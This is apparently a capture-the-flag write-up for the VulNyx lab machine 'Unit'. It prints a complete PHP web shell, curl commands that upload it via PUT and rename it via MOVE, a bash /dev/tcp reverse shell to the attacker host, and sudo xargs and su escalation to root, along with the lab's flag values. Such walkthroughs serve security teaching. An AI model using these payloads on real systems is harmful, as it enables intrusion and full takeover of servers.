# [VulNyx](https://vulnyx.com/): Unit Writeup  

<img width="849" height="435" alt="Screenshot 2026-07-09 214535" src="https://github.com/user-attachments/assets/e567cca0-e4dc-4f86-9b82-6522922ff0e4" />

---

# 🎯 Target Information

- **Platform:** VulNyx.com
- **Machine Name:** UNIT
- **Difficulty:** Easy
- **Key Vulnerabilities:**
  - Dangerous HTTP Methods (PUT & MOVE)
  - Arbitrary File Upload
  - Remote Code Execution (RCE)
  - Misconfigured Sudo Permissions
  - Privilege Escalation via GTFOBins

---

# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```text
$ sudo arp-scan  --localnet
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.29.1    d8:78:c9:99:bc:d9       (Unknown)
192.168.29.180  ca:df:ed:b9:e8:2c       (Unknown: locally administered)
192.168.29.205  00:f1:f3:f9:16:4e       (Unknown)
192.168.29.237  00:0c:29:fa:30:d4       (Unknown)
192.168.29.122  c2:22:42:ed:a2:c0       (Unknown: locally administered)
192.168.29.197  2a:0d:cc:c7:6e:ce       (Unknown: locally administered)
192.168.29.25   d4:d2:d6:64:b4:ea       (Unknown)

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.913 seconds (133.82 hosts/sec). 7 responded
```

The target machine IP address was identified as:

```text
192.168.29.237
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.29.237
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.29.237
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 07:13 -0700
Nmap scan report for 192.168.29.237
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: 415 Unsupported Media Type
|_http-server-header: nginx/1.22.1
8080/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Potentially risky methods: PUT MOVE
|_http-title: 415 Unsupported Media Type
|_http-server-header: nginx/1.22.1
MAC Address: 00:0C:29:FA:30:D4 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
```

### Findings

- Port **22** → SSH
- Port **80** → HTTP
- Port **8080** → HTTP

The Nmap scan also revealed that the server supports the potentially dangerous **PUT** and **MOVE** HTTP methods.

---

# 🌐 Web Enumeration

Open port **80** in the browser.

<img width="1918" height="379" alt="Screenshot_2026-07-09_07_19_01" src="https://github.com/user-attachments/assets/05514b25-a5c5-43ee-a3db-59db05df95dd" />

Open port **8080** in the browser.

<img width="1918" height="403" alt="Screenshot_2026-07-09_07_19_11" src="https://github.com/user-attachments/assets/cec4de5f-ac41-4f07-9f97-2e3ab97a7a0b" />

Both pages displayed the following message:

```text
415 Unsupported Media Type
```

Since Nmap reported dangerous HTTP methods, the next step was to verify which methods the server accepts.

---

# 🔍 HTTP Method Enumeration

Retrieve the response headers.

```bash
curl -I http://192.168.29.237:8080/
```

## Result

```text
$ curl -I http://192.168.29.237:8080/                                          
HTTP/1.1 415 Unsupported Media Type
Server: nginx/1.22.1
Date: Thu, 09 Jul 2026 19:52:16 GMT
Content-Type: text/html
Content-Length: 179
Connection: keep-alive

```

Next, send an **OPTIONS** request.

```bash
curl -vX OPTIONS http://192.168.29.237:8080/
```

## Result

```text
$ curl -vX OPTIONS http://192.168.29.237:8080/
*   Trying 192.168.29.237:8080...
* Established connection to 192.168.29.237 (192.168.29.237 port 8080) from 192.168.29.56 port 41184 
* using HTTP/1.x
> OPTIONS / HTTP/1.1
> Host: 192.168.29.237:8080
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.22.1
< Date: Thu, 09 Jul 2026 19:56:42 GMT
< Content-Type: application/octet-stream
< Content-Length: 0
< Connection: keep-alive
< Allow: OPTIONS, PUT, MOVE
< 
* Connection #0 to host 192.168.29.237:8080 left intact
```

### Important Finding

The server allows only the following HTTP methods:

- OPTIONS
- PUT
- MOVE

This indicates that arbitrary file uploads may be possible.

---

# 📤 Uploading a Web Shell

Create a PHP web shell and save it as **shell.txt**.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Upload the file using the **PUT** method.

```
curl -v -X PUT --upload-file shell.txt http://192.168.102.51:8080/shell.txt
```
## Result
```
$ curl -v -X PUT --upload-file shell.txt http://192.168.102.51:8080/shell.txt                        
Note: Unnecessary use of -X or --request, PUT is already inferred.
*   Trying 192.168.102.51:8080...
* Established connection to 192.168.102.51 (192.168.102.51 port 8080) from 192.168.102.76 port 34250 
* using HTTP/1.x
> PUT /shell.txt HTTP/1.1
> Host: 192.168.102.51:8080
> User-Agent: curl/8.20.0
> Accept: */*
> Content-Length: 347
> 
* upload completely sent off: 347 bytes
< HTTP/1.1 201 Created
< Server: nginx/1.22.1
< Date: Thu, 09 Jul 2026 21:36:20 GMT
< Content-Length: 0
< Location: http://192.168.102.51:8080/shell.txt
< Connection: keep-alive
< 
* Connection #0 to host 192.168.102.51:8080 left intact
```
After navigating to the upload destination.
```text
http://192.168.102.51:8080/shell.txt
```
<img width="1918" height="535" alt="Screenshot_2026-07-09_07_58_11" src="https://github.com/user-attachments/assets/5105d578-f40a-43a5-8aaf-3dda8086c54f" />

The file was successfully uploaded as:
---

# 🔄 Renaming the File

Since the server accepts the **MOVE** method, rename the uploaded file from `.txt` to `.php`.

```bash
curl -X MOVE -H "Destination: http://192.168.29.237:8080/shell.php" http://192.168.29.237:8080/shell.txt
```

The web shell was successfully renamed to:

```text
shell.php
```

Navigate to the file in the browser to access the web shell.

<img width="1918" height="303" alt="Screenshot_2026-07-09_08_04_48" src="https://github.com/user-attachments/assets/38d3225b-e606-489a-8f82-55ee87193f31" />

---

# 🚀 Remote Code Execution

Start a Netcat listener on the attacker machine.

```bash
sudo nc -lvnp 443
```

Execute the following reverse shell command through the web shell.

```bash
bash -c "bash -i >& /dev/tcp/192.168.29.56/443 0>&1"
```

## Result

```text
$ sudo nc -lvnp 443
[sudo] password for arc: 
listening on [any] 443 ...
connect to [192.168.102.76] from (UNKNOWN) [192.168.102.51] 59242
id ; whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

Successfully obtained a reverse shell as the **www-data** user.

---

# 🔧 Upgrading the Shell

Upgrade the reverse shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:   `Ctrl + Z`

Then execute:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The shell is now fully interactive.

---

# 🔍 Privilege Escalation (www-data → jones)

Check the available sudo permissions.

```bash
sudo -l
```

## Result

```text
www-data@unit:~/unit$ sudo -l
Matching Defaults entries for www-data on unit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on unit:
    (jones) NOPASSWD: /usr/bin/xargs
www-data@unit:~/unit$ 
```

### Important Finding

The `xargs` binary can be abused using the **GTFOBins** technique.

<img width="1017" height="376" alt="Screenshot_2026-07-09_08_53_06" src="https://github.com/user-attachments/assets/83b28463-dfbb-4f3d-8741-f2312cbd9b3b" />

Execute:

```bash
sudo -u jones /usr/bin/xargs -a /dev/null /bin/sh -p
```

Verify the current user.

```bash
id ; whoami
```

## Result

```text
$ id ; whoami
uid=1000(jones) gid=1000(jones) groups=1000(jones)
jones

```

Successfully escalated privileges to the **jones** user.

---

# 🏁 User Flag

Navigate to the user's home directory.

```bash
cat /home/jones/user.txt
```

## Result

```text
956f4558a2cf5c2b8d55f2c4b1f4da91
```

---

# 🔍 Privilege Escalation (jones → root)

Check the sudo permissions again.

```bash
sudo -l
```

## Result

```text
$ sudo -l
Matching Defaults entries for jones on unit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User jones may run the following commands on unit:
    (root) NOPASSWD: /usr/bin/su
$ 
```

Since `su` can be executed without a password, simply run:

```bash
sudo /usr/bin/su -p
```

Verify the current privileges.

```bash
id ; whoami
```

## Result

```text
root@unit:/home/jones# id ; whoami
uid=0(root) gid=0(root) grupos=0(root)
root
root@unit:/home/jones# 

```

Successfully escalated privileges to the **root** user.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
0d65e83f34a9f15f04ca3ec89cc25595
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Web Enumeration | HTTP Methods |
| Initial Access | PUT & MOVE File Upload |
| Remote Code Execution | PHP Web Shell |
| Privilege Escalation | GTFOBins (`xargs`) |
| Root Escalation | Misconfigured `sudo su` |
| Root Access | Read Root Flag |

---

# 🚀 Key Takeaways

- Dangerous HTTP methods such as **PUT** and **MOVE** should never be enabled unless absolutely necessary.
- Upload validation should never rely solely on file extensions.
- Misconfigured sudo permissions can quickly lead to privilege escalation.
- GTFOBins is an invaluable resource for identifying privilege escalation techniques involving legitimate binaries.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
